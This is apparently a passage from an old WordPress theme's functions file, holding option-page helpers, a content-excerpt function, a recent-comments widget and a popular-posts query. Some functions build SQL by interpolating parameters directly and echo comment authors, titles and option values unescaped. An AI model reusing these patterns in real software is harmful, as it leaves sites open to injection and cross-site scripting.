<input type="hidden" name="action" value="save" />
</p>
</form>

<?php
}
function option_wrapper_header($values){
?>
<tr valign="top">
    <th scope="row"><?php echo $values['name']; ?>:</th>
	    <td>
<?php
}
function option_wrapper_footer($values){
?>
    </td>
	</tr>
	<tr valign="top">
		<td>&nbsp;</td><td><small><?php echo $values['desc']; ?></small></td>
	</tr>
    </div>
<?php
}
function mytheme_wp_head() {
	$stylesheet = get_option('green_alt_stylesheet');
	if($stylesheet != ''){?>
<?php }
}
add_action('wp_head', 'mytheme_wp_head');
add_action('admin_menu', 'mytheme_add_admin');
?>
<?php function get_custom_field_value($szKey, $bPrint = false) {  
global $post;  
$szValue = get_post_meta($post->ID, $szKey, true);  
if ( $bPrint == false ) return $szValue; else echo $szValue;  
}?>
<?php function the_content_limit($max_char, $more_link_text = '(more...)', $stripteaser = 0, $more_file = '') {
    $content = get_the_content($more_link_text, $stripteaser, $more_file);
    $content = apply_filters('the_content', $content);
    $content = str_replace(']]>', ']]&gt;', $content);
    $content = strip_tags($content);
   if (strlen($_GET['p']) > 0) {
      echo "<p>";
      echo $content;
      echo "&nbsp;<a href='";
      the_permalink();
      echo "'>"."<b>&#187;View More</b></a>";
      echo "</p>";
   }
   else if ((strlen($content)>$max_char) && ($espacio = strpos($content, " ", $max_char ))) {
        $content = substr($content, 0, $espacio);
        $content = $content;
        echo "<p>";
        echo $content;
        echo "...";
        echo "&nbsp;<a href='";
        the_permalink();
        echo "'>".$more_link_text."</a>";
        echo "</p>";
   }
   else {
      echo "<p>";
      echo $content;
      echo "&nbsp;<a href='";
      the_permalink();
      echo "'>"."<b>&#187;View More</b></a>";
      echo "</p>";
   }
}?>
<?php
function src_simple_recent_comments($src_count=7, $src_length=60, $pre_HTML='', $post_HTML='') {
global $wpdb;
$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, 
SUBSTRING(comment_content,1,$src_length) AS com_excerpt 
FROM $wpdb->comments
LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID)
WHERE comment_approved = '1' AND comment_type = '' AND post_password = '' 
		ORDER BY comment_date_gmt DESC
LIMIT $src_count";
$comments = $wpdb->get_results($sql);
$output = $pre_HTML;
$output .= "\n<ul>";
foreach ($comments as $comment) {
$output .= "\n\t<li><a href=\"" . get_permalink($comment->ID) . "#comment-" . $comment->comment_ID  . "\" title=\"on " . $comment->post_title . "\">" . $comment->comment_author . "</a>: " . strip_tags($comment->com_excerpt) . "...</li>";
}
$output .= "\n</ul>";
$output .= $post_HTML;
echo $output;}?>
<?php
function dp_popular_posts($num, $pre='<li>', $suf='</li>', $excerpt=true) {
	global $wpdb;
	$querystr = "SELECT $wpdb->posts.post_title, $wpdb->posts.ID, $wpdb->posts.post_content FROM $wpdb->posts WHERE $wpdb->posts.post_status = 'publish' AND $wpdb->posts.post_type = 'post' ORDER BY $wpdb->posts.comment_count DESC LIMIT $num";
	$myposts = $wpdb->get_results($querystr, OBJECT);
	foreach($myposts as $post) {
		echo $pre;
		?><h3 class="pop"><a href="<?php echo get_permalink($post->ID); ?>"><?php echo $post->post_title ?></a></h3><?php
		if ($excerpt) {
			?><?php echo dp_clean($post->post_content, 120); ?>...<?php
		}
		echo $suf;
	}
}
function dp_clean($excerpt, $substr=0) {
	$string = strip_tags(str_replace('[...]', '...', $excerpt));
	if ($substr>0) {
		$string = substr($string, 0, $substr);
	}
	return $string;
}
?>
